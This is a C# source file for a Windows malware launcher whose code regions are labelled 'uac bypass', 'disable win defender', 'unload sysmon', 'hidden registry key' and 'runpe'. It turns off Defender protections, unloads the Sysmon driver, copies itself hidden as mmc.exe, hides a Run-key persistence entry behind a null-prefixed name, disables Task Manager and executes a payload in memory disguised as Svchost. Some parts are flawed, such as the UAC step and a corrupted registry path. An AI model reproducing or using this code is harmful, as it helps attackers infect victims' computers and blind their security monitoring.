using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;

namespace Launchner
{
    class Program
    {
        static void Main(string[] args)
        {
            #region uac bypass
            try
            {
                RegistryKey uac = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
                if (uac == null)
                {
                    uac = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                }
                uac.SetValue("EnableLUA", 1);
                uac.Close();
            }
            catch { }
            string fileName = Assembly.GetExecutingAssembly().Location;
            ProcessStartInfo processInfo = new ProcessStartInfo();
            processInfo.Verb = "runas";
            processInfo.FileName = fileName;
            #endregion
            #region hidden startup shit
            UIntPtr regKeyHandle = UIntPtr.Zero;
            string runKeyPath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
            string runKeyPathTrick = "\0\0SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
            bool IsSystem;
            using (var identity = System.Security.Principal.WindowsIdentity.GetCurrent())
            {
                IsSystem = identity.IsSystem;
            }

            uint Status = 0xc0000000;
            uint STATUS_SUCCESS = 0x00000000;

            if (IsSystem || IsElevated)
            {
                //Elevated
                Status = RegOpenKeyEx(HKEY_LOCAL_MACHINE, runKeyPath, 0, KEY_SET_VALUE, out regKeyHandle);
            }
            else
            {
                //Not evelated
                Status = RegOpenKeyEx(HKEY_CURRENT_USER, runKeyPath, 0, KEY_SET_VALUE, out regKeyHandle);
            }
            UNICODE_STRING ValueName = new UNICODE_STRING(runKeyPathTrick)
            {
                Length = 2 * 11,
                MaximumLength = 0
            };
            IntPtr ValueNamePtr = StructureToPtr(ValueName);
            UNICODE_STRING ValueData;
            ValueData = new UNICODE_STRING("\"" + Environment.CurrentDirectory + "//" + AppDomain.CurrentDomain.FriendlyName + "\"");
            #endregion
            Process[] processes = Process.GetProcesses();
            foreach (var rootkit in processes)
            {
                if (!rootkit.ProcessName.Contains("Umbrella"))
                {
                    if (args[0] == "alreadyInstalled")
                    {
                        #region disable win defender
                        RegistryKey Tamper = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows Defender\Features", true);
                        Tamper.SetValue("TamperProtection", 4, RegistryValueKind.DWord);
                        Tamper.Close();
                        RegistryKey PolicyFromDisable = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender", true);
                        try
                        {
                            PolicyFromDisable.GetValue("DisableAntiSpyware");
                            PolicyFromDisable.CreateSubKey("DisableAntiSpyware");
                            PolicyFromDisable.SetValue("DisableAntiSpyware", 1, RegistryValueKind.DWord);
                        }
                        catch (Exception) //value doesnt exists
                        {
                            PolicyFromDisable.CreateSubKey("DisableAntiSpyware");
                            PolicyFromDisable.SetValue("DisableAntiSpyware", 1, RegistryValueKind.DWord); 
                        }
                        #endregion
                        #region drop launcher
                        string droploc = @"C:\Users\" + Environment.UserName + @"\Appdata\Local\mmc.exe";
                        File.Copy(Environment.CurrentDirectory + "//" + AppDomain.CurrentDomain.FriendlyName, droploc);
                        File.SetAttributes(droploc, File.GetAttributes(droploc) | FileAttributes.Hidden | FileAttributes.System);
                        #endregion
                        #region unload sysmon
                        ProcessStartInfo process = new ProcessStartInfo()
                        {
                            WindowStyle = ProcessWindowStyle.Hidden,
                            CreateNoWindow = true,
                            FileName = @"C:\windows\system32\fltMC.exe",
                            UseShellExecute = true,
                            Arguments = "unload SysmonDrv",
                            Verb = "runas"
                        };
                        Process.Start(process);
                        #endregion
                        #region hidden registry key
                        try
                        {
                            Status = NtSetValueKey(regKeyHandle, ValueNamePtr, 0, RegistryKeyType.REG_SZ, ValueData.buffer, ValueData.MaximumLength);
                            if (Status.Equals(STATUS_SUCCESS))
                            {
                                //Key creation not failed
                                RegCloseKey(regKeyHandle);
                            }
                            else
                            {
                                //Key creation failed
                                RegCloseKey(regKeyHandle);
                            }
                        }
                        catch { }
                        #endregion
                        #region disable task manager
                        RegistryKey DisableTaskMgr = Registry.CurrentUser.OpenSubKey(@"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Syste​m", true);
                        DisableTaskMgr.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                        DisableTaskMgr.Close();
                        #endregion
                        #region runpe
                        CMemoryExecute.Run("EXECUTABLE BYTES", "Svchost");
                        #endregion
                    }
                    else
                    {
                        #region disable win defender
                        RegistryKey Tamper = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows Defender\Features", true);
                        Tamper.SetValue("TamperProtection", 4, RegistryValueKind.DWord);
                        Tamper.Close();
                        RegistryKey PolicyFromDisable = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender", true);
                        try
                        {
                            PolicyFromDisable.GetValue("DisableAntiSpyware");
                            PolicyFromDisable.CreateSubKey("DisableAntiSpyware");
                            PolicyFromDisable.SetValue("DisableAntiSpyware", 1, RegistryValueKind.DWord);
                        }
                        catch (Exception) //value doesnt exists
                        {
                            PolicyFromDisable.CreateSubKey("DisableAntiSpyware");
                            PolicyFromDisable.SetValue("DisableAntiSpyware", 1, RegistryValueKind.DWord);
                        }
                        #endregion
                        #region unload sysmon
                        ProcessStartInfo process = new ProcessStartInfo()
                        {
                            WindowStyle = ProcessWindowStyle.Hidden,
                            CreateNoWindow = true,
                            FileName = @"C:\windows\system32\fltMC.exe",
                            UseShellExecute = true,
                            Arguments = "unload SysmonDrv",
                            Verb = "runas"
                        };
                        Process.Start(process);
                        #endregion
                        #region hidden registry key
                        Status = NtSetValueKey(regKeyHandle, ValueNamePtr, 0, RegistryKeyType.REG_SZ, ValueData.buffer, ValueData.MaximumLength);
                        if (Status.Equals(STATUS_SUCCESS))
                        {
                            //Key creation not failed
                            RegCloseKey(regKeyHandle);
                        }
                        else
                        {
                            //Key creation failed
                            RegCloseKey(regKeyHandle);
                        }
                        #endregion
                        #region disable task manager
                        RegistryKey DisableTaskMgr = Registry.CurrentUser.OpenSubKey(@"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Syste​m", true);
                        DisableTaskMgr.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                        DisableTaskMgr.Close();
                        #endregion
                        #region runpe
                        CMemoryExecute.Run("EXECUTABLE BYTES", "Svchost");
                        #endregion
                    }
                }
            }
        }
        #region registry shit
        [StructLayout(LayoutKind.Sequential)]
        public struct UNICODE_STRING : IDisposable
        {
            public ushort Length;
            public ushort MaximumLength;
            public IntPtr buffer;

            public UNICODE_STRING(string s)
            {
                Length = (ushort)(s.Length * 2);
                MaximumLength = (ushort)(Length + 2);
                buffer = Marshal.StringToHGlobalUni(s);
            }

            public void Dispose()
            {
                Marshal.FreeHGlobal(buffer);
                buffer = IntPtr.Zero;
            }

            public override string ToString()
            {
                return Marshal.PtrToStringUni(buffer);
            }
        }

        enum RegistryKeyType
        {
            REG_NONE = 0,
            REG_SZ = 1,
            REG_EXPAND_SZ = 2,
            REG_BINARY = 3,
            REG_DWORD = 4,
            REG_DWORD_LITTLE_ENDIAN = 4,
            REG_DWORD_BIG_ENDIAN = 5,
            REG_LINK = 6,
            REG_MULTI_SZ = 7
        }

        public static UIntPtr HKEY_CURRENT_USER = (UIntPtr)0x80000001;
        public static UIntPtr HKEY_LOCAL_MACHINE = (UIntPtr)0x80000002;
        public static int KEY_QUERY_VALUE = 0x0001;
        public static int KEY_SET_VALUE = 0x0002;
        public static int KEY_CREATE_SUB_KEY = 0x0004;
        public static int KEY_ENUMERATE_SUB_KEYS = 0x0008;
        public static int KEY_WOW64_64KEY = 0x0100;
        public static int KEY_WOW64_32KEY = 0x0200;

        [DllImport("advapi32.dll", CharSet = CharSet.Auto)]
        public static extern uint RegOpenKeyEx(
            UIntPtr hKey,
            string subKey,
            int ulOptions,
            int samDesired,
            out UIntPtr KeyHandle
            );

        [DllImport("ntdll.dll", CharSet = CharSet.Unicode, CallingConvention = CallingConvention.StdCall)]
        static extern uint NtSetValueKey(
            UIntPtr KeyHandle,
            IntPtr ValueName,
            int TitleIndex,
            RegistryKeyType Type,
            IntPtr Data,
            int DataSize
            );

        [DllImport("ntdll.dll", CharSet = CharSet.Unicode, CallingConvention = CallingConvention.StdCall)]
        static extern uint NtDeleteValueKey(
            UIntPtr KeyHandle,
            IntPtr ValueName
            );

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern int RegCloseKey(
            UIntPtr KeyHandle
            );

        static IntPtr StructureToPtr(object obj)
        {
            IntPtr ptr = Marshal.AllocHGlobal(Marshal.SizeOf(obj));
            Marshal.StructureToPtr(obj, ptr, false);
            return ptr;
        }

        public static bool IsElevated
        {
            get
            {
                return WindowsIdentity.GetCurrent().Owner
                  .IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid);
            }
        }
        #endregion
        #region Defender Bypass Shit
        public class TokenManipulation
        {

            public const string CreateToken = "SeCreateTokenPrivilege";
            public const string AssignPrimaryToken = "SeAssignPrimaryTokenPrivilege";
            public const string LockMemory = "SeLockMemoryPrivilege";
            public const string IncreaseQuota = "SeIncreaseQuotaPrivilege";
            public const string UnsolicitedInput = "SeUnsolicitedInputPrivilege";
            public const string MachineAccount = "SeMachineAccountPrivilege";
            public const string TrustedComputingBase = "SeTcbPrivilege";
            public const string Security = "SeSecurityPrivilege";
            public const string TakeOwnership = "SeTakeOwnershipPrivilege";
            public const string LoadDriver = "SeLoadDriverPrivilege";
            public const string SystemProfile = "SeSystemProfilePrivilege";
            public const string SystemTime = "SeSystemtimePrivilege";
            public const string ProfileSingleProcess = "SeProfileSingleProcessPrivilege";
            public const string IncreaseBasePriority = "SeIncreaseBasePriorityPrivilege";
            public const string CreatePageFile = "SeCreatePagefilePrivilege";
            public const string CreatePermanent = "SeCreatePermanentPrivilege";
            public const string Backup = "SeBackupPrivilege";
            public const string Restore = "SeRestorePrivilege";
            public const string Shutdown = "SeShutdownPrivilege";
            public const string Debug = "SeDebugPrivilege";
            public const string Audit = "SeAuditPrivilege";
            public const string SystemEnvironment = "SeSystemEnvironmentPrivilege";
            public const string ChangeNotify = "SeChangeNotifyPrivilege";
            public const string RemoteShutdown = "SeRemoteShutdownPrivilege";
            public const string Undock = "SeUndockPrivilege";
            public const string SyncAgent = "SeSyncAgentPrivilege";
            public const string EnableDelegation = "SeEnableDelegationPrivilege";
            public const string ManageVolume = "SeManageVolumePrivilege";
            public const string Impersonate = "SeImpersonatePrivilege";
            public const string CreateGlobal = "SeCreateGlobalPrivilege";
            public const string TrustedCredentialManagerAccess = "SeTrustedCredManAccessPrivilege";
            public const string ReserveProcessor = "SeReserveProcessorPrivilege";

            [StructLayout(LayoutKind.Sequential)]
            public struct LUID
            {
                public Int32 lowPart;
                public Int32 highPart;
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct LUID_AND_ATTRIBUTES
            {
                public LUID Luid;
                public Int32 Attributes;
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct TOKEN_PRIVILEGES
            {
                public Int32 PrivilegeCount;
                [MarshalAs(UnmanagedType.ByValArray, SizeConst = 64)]
                public LUID_AND_ATTRIBUTES[] Privileges;
            }


            [Flags]
            public enum PrivilegeAttributes
            {
                Disabled = 0,

                EnabledByDefault = 1,

                Enabled = 2,

                Removed = 4,

                UsedForAccess = -2147483648
            }


            [Flags]
            public enum TokenAccessRights
            {
                /// <summary>Right to attach a primary token to a process.</summary>
                AssignPrimary = 0,

                /// <summary>Right to duplicate an access token.</summary>
                Duplicate = 1,

                /// <summary>Right to attach an impersonation access token to a process.</summary>
                Impersonate = 4,

                /// <summary>Right to query an access token.</summary>
                Query = 8,

                /// <summary>Right to query the source of an access token.</summary>
                QuerySource = 16,

                /// <summary>Right to enable or disable the privileges in an access token.</summary>
                AdjustPrivileges = 32,

                AdjustGroups = 64,

                /// <summary>Right to change the default owner, primary group, or DACL of an access token.</summary>
                AdjustDefault = 128,

                /// <summary>Right to adjust the session ID of an access token.</summary>
                AdjustSessionId = 256,

                /// <summary>Combines all possible access rights for a token.</summary>
                AllAccess = AccessTypeMasks.StandardRightsRequired |
                    AssignPrimary |
                    Duplicate |
                    Impersonate |
                    Query |
                    QuerySource |
                    AdjustPrivileges |
                    AdjustGroups |
                    AdjustDefault |
                    AdjustSessionId,

                /// <summary>Combines the standard rights required to read with <see cref="Query"/>.</summary>
                Read = AccessTypeMasks.StandardRightsRead |
                    Query,

                /// <summary>Combines the standard rights required to write with <see cref="AdjustDefault"/>, <see cref="AdjustGroups"/> and <see cref="AdjustPrivileges"/>.</summary>
                Write = AccessTypeMasks.StandardRightsWrite |
                    AdjustPrivileges |
                    AdjustGroups |
                    AdjustDefault,

                /// <summary>Combines the standard rights required to execute with <see cref="Impersonate"/>.</summary>
                Execute = AccessTypeMasks.StandardRightsExecute |
                    Impersonate
            }

            [Flags]
            internal enum AccessTypeMasks
            {
                Delete = 65536,

                ReadControl = 131072,

                WriteDAC = 262144,

                WriteOwner = 524288,

                Synchronize = 1048576,

                StandardRightsRequired = 983040,

                StandardRightsRead = ReadControl,

                StandardRightsWrite = ReadControl,

                StandardRightsExecute = ReadControl,

                StandardRightsAll = 2031616,

                SpecificRightsAll = 65535
            }



            [DllImport("advapi32.dll", SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            internal static extern bool AdjustTokenPrivileges(
                [In] IntPtr accessTokenHandle,
                [In, MarshalAs(UnmanagedType.Bool)] bool disableAllPrivileges,
                [In] ref TOKEN_PRIVILEGES newState,
                [In] int bufferLength,
                [In, Out] ref TOKEN_PRIVILEGES previousState,
                [In, Out] ref int returnLength);

            [DllImport("kernel32.dll", SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            internal static extern bool CloseHandle(
                [In] IntPtr handle);

            [DllImport("kernel32.dll")]
            static extern IntPtr GetCurrentProcess();

            [DllImport("advapi32.dll", SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            static extern bool OpenProcessToken(IntPtr ProcessHandle, UInt32 DesiredAccess, out IntPtr TokenHandle);


            [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            internal static extern bool LookupPrivilegeName(
               [In] string systemName,
               [In] ref LUID luid,
               [In, Out] StringBuilder name,
               [In, Out] ref int nameLength);

            [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            internal static extern bool LookupPrivilegeValue(
                [In] string systemName,
                [In] string name,
                [In, Out] ref LUID luid);


            [DllImport("advapi32.dll", SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            internal static extern bool OpenProcessToken(
                [In] IntPtr processHandle,
                [In] TokenAccessRights desiredAccess,
                [In, Out] ref IntPtr tokenHandle);

            [DllImport("kernel32.dll", SetLastError = true)]
            internal static extern Int32 GetLastError();


            public static bool MySetPrivilege(string sPrivilege, bool enablePrivilege)
            {
                bool blRc;
                TOKEN_PRIVILEGES newTP = new TOKEN_PRIVILEGES();
                TOKEN_PRIVILEGES oldTP = new TOKEN_PRIVILEGES();
                LUID luid = new LUID();
                int retrunLength = 0;
                IntPtr processToken = IntPtr.Zero;

                blRc = OpenProcessToken(GetCurrentProcess(), TokenAccessRights.AllAccess, ref processToken);
                if (blRc == false)
                    return false;


                blRc = LookupPrivilegeValue(null, sPrivilege, ref luid);
                if (blRc == false)
                    return false;

                newTP.PrivilegeCount = 1;
                newTP.Privileges = new LUID_AND_ATTRIBUTES[64];
                newTP.Privileges[0].Luid = luid;

                if (enablePrivilege)
                    newTP.Privileges[0].Attributes = (Int32)PrivilegeAttributes.Enabled;
                else
                    newTP.Privileges[0].Attributes = (Int32)PrivilegeAttributes.Disabled;

                oldTP.PrivilegeCount = 64;
                oldTP.Privileges = new LUID_AND_ATTRIBUTES[64];
                blRc = AdjustTokenPrivileges(processToken,
                                              false,
                                              ref newTP,
                                              16,
                                              ref oldTP,
                                              ref retrunLength);
                if (blRc == false)
                {
                    Int32 iRc = GetLastError();
                    return false;
                }
                return true;
            }
        }
        #endregion
    }
}
